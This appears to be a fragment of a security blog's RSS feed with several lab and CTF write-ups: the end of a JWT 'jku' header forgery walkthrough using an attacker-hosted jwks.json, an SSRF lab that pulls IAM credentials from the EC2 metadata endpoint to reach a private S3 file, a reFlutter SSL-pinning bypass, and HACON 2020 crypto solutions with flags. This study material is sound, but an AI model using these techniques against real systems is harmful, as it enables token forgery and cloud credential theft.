+If the server validate the original url, we can use the Redirect method like above. If not, you can use just like &lt;code&gt;&quot;jku&quot;: &quot;http://yourwebsever.com/jwks.json&quot;&lt;/code&gt;
+!!!&lt;/p&gt;
+&lt;p&gt;Run that script and we will get a new token like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjY1OjgwMDAvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.8XfoCJP-whwgrE02ZGPuS6mLmVuvzZ9StyUBb92M6GZLgUVLWmew-Bo7QTBmIa7JJSLONmKOqefbcVJVExmm8YCf95tCmKlLM28Nzq2lQsxlZh5v-cDJ21sHL5O1hahB7sJCULZDSRwrOEwWwS2y_eBtGr70RBqst0j8135S9ppHDXgcP0xWVkTV-x0jVpXNyfX-ETxIyjqlrIw7M2nX6AXS2bhvraYtKx7ARHxh52PsirawfyQhwElb1-AF4hKWElDKnEV9kPHa2D-KFp-ESUQFx8sQMH0Q4saDQCmwibT61H92qn8geH1k_KlC90-BM1pgik1IqMNrmRJa4YA0nQ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now create a web server, copy that a new token and replace it in a cookie header in web page.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 -m http.server 8000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When we replace the token and refresh page, it will request/download &lt;code&gt;jwks.json&lt;/code&gt; file in our web server.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/web/json6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/web/json7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we got admin panel by &lt;code&gt;jku header claiming&lt;/code&gt; method.&lt;/p&gt;
+</content:encoded></item><item><title>SSRF to S3 Bucket Compromised</title><link>https://fuwari.vercel.app/posts/cloud-security/ssrf-to-s3-bucket-compromised/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/cloud-security/ssrf-to-s3-bucket-compromised/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Description&lt;/h3&gt;
+&lt;p&gt;This challenge from &lt;a href=&quot;https://pwnedlabs.io/labs/ssrf-to-pwned&quot;&gt;pwnedlab&lt;/a&gt; is easy and beginner friendly called SSRF to Pwned.&lt;/p&gt;
+&lt;p&gt;The starting point is a single url : http://app.huge-logistics.com&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/aws/ssrf1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Think of S3 bucket like a folder in the cloud. We can use it to store any kind of file or data, from documents to images. It can also use to store static file for our websites. Sometimes developers are store sensitive files in s3 bucket. So it&apos;s worth to enumerate s3 bucket during cloud pentest beacuse S3 buckets are often misconfigured.&lt;/p&gt;
+&lt;h3&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;When we checked the website’s source code, we can see that the webpage stores its image files in an S3 bucket.
+&lt;img src=&quot;/src/assets/aws/ssrf2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;huge-logistics-storage&lt;/code&gt; is the name of the bucket. When we look at the S3 bucket, we can see a couple of authentication configurations. &lt;code&gt;AuthenticatedUsers&lt;/code&gt; and &lt;code&gt;Unauthenticated(anonymous)&lt;/code&gt;. For &lt;code&gt;AuthenticatedUsers&lt;/code&gt;, access can be granted for specific IAM users/roles or to all AWS accounts.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;AuthenticatedUsers Access&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&amp;lt;b&amp;gt; For specific IAM access&amp;lt;/b&amp;gt; which mean permissions that are granted only to particular IAM users/roles&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&amp;lt;b&amp;gt;For any valid AWS users&amp;lt;/b&amp;gt; If a bucket policy or ACL grants permissions to this group, it means any AWS account with valid credentials can access.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Unauthenticated (Anonymous) Access&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;&amp;lt;b&amp;gt;Anyone on the internet&amp;lt;/b&amp;gt; can list or get the objects.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;AWS CLI&lt;/h3&gt;
+&lt;p&gt;We can check the by command line below&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# admin_cloud6 is just my own aws account
+aws s3 ls s3://huge-logistics-storage --profile admin_cloud6
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:iam::427648302155:user/it-admin is not authorized to perform: s3:ListBucket on resource: &quot;arn:aws:s3:::huge-logistics-storage&quot; because no identity-based policy allows the s3:ListBucket action
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For the unauthenticated request, we can use &lt;code&gt;--no-sign-request&lt;/code&gt; argument.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 ls s3://huge-logistics-storage --recursive --no-sign-request                       
+2023-06-01 05:14:05          0 backup/
+2023-06-01 05:14:47       3717 backup/cc-export2.txt
+2023-06-01 21:38:27         32 backup/flag.txt
+2023-06-01 03:40:47          0 web/
+2023-06-01 03:42:33     114886 web/images/about.jpg
+2023-06-01 03:42:34     271657 web/images/banner.jpg
+2023-06-01 03:42:35      48441 web/images/blog1.jpg
+2023-06-01 03:42:36      32805 web/images/blog2.jpg
+2023-06-01 03:42:36      44570 web/images/blog3.jpg
+2023-06-01 03:42:37      20032 web/images/executive.jpg
+2023-06-01 03:42:37      13368 web/images/manager.jpg
+2023-06-01 03:42:38      18260 web/images/manager1.jpg
+2023-06-01 03:42:38      42216 web/images/signature.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is &lt;code&gt;flag.txt&lt;/code&gt; file in backup folder. We can download it &lt;code&gt;cp&lt;/code&gt; command as follow:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --no-sign-request
+fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It give an error because we don&apos;t have enough access to download it. If we go back to the webpage, there is an endpoint called &lt;code&gt;status.php&lt;/code&gt; as follow:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;http://app.huge-logistics.com/status/status.php?name=hugelogisticsstatus.com&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Which check the status of the website.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/aws/ssrf3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Getting AWS Secret&lt;/h3&gt;
+&lt;p&gt;We can check this &lt;code&gt;SSRF&lt;/code&gt; via burp collaborator or localhost &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/aws/ssrf4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Or we can check &lt;code&gt;metadata&lt;/code&gt; of ec2 instance on this endpoint : &lt;code&gt;169.254.169.254/latest/meta-data/&lt;/code&gt;
+&lt;img src=&quot;/src/assets/aws/ssrf5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;To grab the aws id and secret key, we need to check first is there any IAM role configured or not from this endpoint &lt;code&gt;169.254.169.254/latest/meta-data/iam/info&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/aws/ssrf6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can make a request to fetch &lt;code&gt;MetapwnedS3Access&lt;/code&gt;&apos;s secret with this url: &lt;code&gt;169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/aws/ssrf7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;By using this aws secret, we can configure aws credential to interact with &lt;code&gt;awscli&lt;/code&gt; as shown below&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/aws/ssrf8.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;And then we can validate with this command. This is similar to &lt;code&gt;whoami&lt;/code&gt; command in linux.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws sts get-caller-identity --profile metapwned
+{
+    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
+    &quot;Account&quot;: &quot;104506445608&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!TIP]
+If you don&apos;t want to add &lt;code&gt;--profile&lt;/code&gt; argument every time you run a command, you can set it as a defult profile like this&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;export AWS_PROFILE=metapwned
+aws sts get-caller-identity                    
+{
+    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
+    &quot;Account&quot;: &quot;104506445608&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Compromised S3 Bucket Access&lt;/h3&gt;
+&lt;p&gt;Now that we have IAM role access, let’s try downloading the &lt;code&gt;flag.txt&lt;/code&gt; file again using this profile.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt .
+download: s3://huge-logistics-storage/backup/flag.txt to ./flag.txt
+
+cat flag.txt 
+282f08a114b4b4f2d345100dXXXXXXXX         
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This time we were able to download successfully the flag file from the compromised S3 bucket.&lt;/p&gt;
+</content:encoded></item><item><title>Bypass SSL Pinning for flutter apps using reFlutter tool</title><link>https://fuwari.vercel.app/posts/android/bypass-ssl-pinning-reflutter/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/android/bypass-ssl-pinning-reflutter/</guid><pubDate>Wed, 05 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Flutter apps are a little bit different and hard to bypass ssl pinning.There are many method to bypass ssl pinning for flutter apps and I&apos;m gonna show you one of the method to bypass ssl pinning using &lt;code&gt;reflutter&lt;/code&gt; flamework.&lt;/p&gt;
+&lt;p&gt;This framework helps with Flutter apps reverse engineering using the patched version of the Flutter library which is already compiled and ready for app repacking. This library has snapshot deserialization process modified to allow you perform dynamic analysis.&lt;/p&gt;
+&lt;h4&gt;Installation&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;pip3 install reflutter
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Here is the flutter apps to test&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;https://github.com/thedarksource/Android/tree/master/flutter-test-apps&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We have two type of requests &lt;code&gt;HTTP&lt;/code&gt; and &lt;code&gt;HTTPS&lt;/code&gt; , First let&apos;s check &lt;code&gt;HTTP&lt;/code&gt; Request.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The traffic through the burpsuite and we will get success response.But If we click on HTTPS Request ,we will get error like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So, let&apos;s bypass it using &lt;code&gt;reflutter&lt;/code&gt; tool.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;reflutter flutter-apps.apk
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;IP&lt;/code&gt; is our host machine IP which running burpsuite.
+Now we will get &lt;code&gt;release.RE.apk&lt;/code&gt; but this apk hasn&apos;t signed yet. We have to sign manually.&lt;/p&gt;
+&lt;p&gt;I used &lt;a href=&quot;https://github.com/patrickfav/uber-apk-signer&quot;&gt;uber-apk-signer&lt;/a&gt;  in here. You can use your own method.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;java -jar uber-apk-signer-1.2.1.jar --apk release.RE.apk
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now install signed apk in your device.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;adb install release.RE-aligned-debugSigned.apk
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;For the next step, we have to configure the proxy in burpsuite.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;First, change port to &lt;code&gt;8083&lt;/code&gt; because reFlutter set it by default.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In &lt;code&gt;Request handling&lt;/code&gt; tab, enable &lt;code&gt;Support invisible proxying&lt;/code&gt; and click on OK.&lt;/p&gt;
+&lt;p&gt;Now open the new apk and click on HTTPS Request.&lt;/p&gt;
+&lt;p&gt;:::warning[NOTE]
+we need to turn off proxy because reflutter is already modifed and set the proxy settings in the patched app.
+:::&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/android/reflutter/reflutter11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can intercept the &lt;code&gt;HTTPS&lt;/code&gt; traffic of the flutter based app by using &lt;code&gt;reFlutter&lt;/code&gt; tool.&lt;/p&gt;
+&lt;h4&gt;References&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;https://github.com/ptswarm/reFlutter&lt;/li&gt;
+&lt;li&gt;https://github.com/thedarksource/Android/tree/master/flutter-test-apps&lt;/li&gt;
+&lt;li&gt;https://github.com/patrickfav/uber-apk-signer/releases/&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>HACON 2020 CTF Writeup</title><link>https://fuwari.vercel.app/posts/ctf/hacon-2020-ctf-writeup/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/ctf/hacon-2020-ctf-writeup/</guid><pubDate>Sun, 27 Sep 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I’ve never posted a CTF writeup before since I usually just keep my notes in &lt;code&gt;CherryTree&lt;/code&gt;. But today, I finally decided to share one.&lt;/p&gt;
+&lt;h3&gt;Chalenges Summary&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#cryptography&quot;&gt;Cryptography - 4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#misc&quot;&gt;Misc - 4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Forensics [3]&lt;/li&gt;
+&lt;li&gt;OSINT [1]&lt;/li&gt;
+&lt;li&gt;Web [1]&lt;/li&gt;
+&lt;li&gt;Networking [1]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let’s start with Cryptography&lt;/p&gt;
+&lt;p&gt;I could&apos;ve sovled 4 challenges under cryto category.&lt;/p&gt;
+&lt;h2&gt;Cryptography&lt;/h2&gt;
+&lt;h4&gt;1. BiG BrAiN (80)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;This is the content of &lt;code&gt;ciphertext.txt&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Obviously , It’s a brain fuck language ,so I decode it from &lt;a href=&quot;https://www.dcode.fr/brainfuck-language&quot;&gt;Here&lt;/a&gt; and get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{y3s_y0u_n33d_br4in_t0_Cr4Ck_Br4inf#ck}
+:::&lt;/p&gt;
+&lt;h4&gt;2.ARE u SuRE(100)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ciphertext.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;My first thought was &lt;code&gt;ASCII85&lt;/code&gt;, but it didn’t work. I have seen similar like this before in &lt;code&gt;JohnHammond&lt;/code&gt; youtube video which mentioning about &lt;code&gt;Malbolge&lt;/code&gt;.
+&lt;code&gt;Malbolge&lt;/code&gt; is an esoteric programming language created by Ben Olmstead in 1998, intentionally designed to be one of the most difficult to use.&lt;/p&gt;
+&lt;p&gt;Paste it in &lt;a href=&quot;http://malbolge.doleczek.pl/&quot;&gt;HERE&lt;/a&gt; , click on run program and we will get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{3so7eRiC_Is_M3Ss3d_Up}
+:::&lt;/p&gt;
+&lt;h4&gt;3.Baby RSA(100)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;clue.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;A &lt;code&gt;clue.txt&lt;/code&gt; file was included RSA-encrypted text. Luckily, I&apos;d already solved similar RSA challenges before, so I used my existing python script to solve it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{R54_baBy_i5_35Sy}
+:::&lt;/p&gt;
+&lt;h4&gt;4.MIRROR MIRROR(100)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ct.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I removed chr() with sublime text and decode it with &lt;a href=&quot;https://cryptii.com/pipes/decimal-text&quot;&gt;decimal to text&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I got another numbers. I was confused a moment and then I thought it might be another decimal, so I splited it by space and decode it again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/ctf/hacon2020/hacon14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{M1RROR_!S_4LWAYS_BE4UTIF!ES_US}
+:::&lt;/p&gt;
+&lt;h2&gt;Misc&lt;/h2&gt;
+</content:encoded></item></channel></rss>
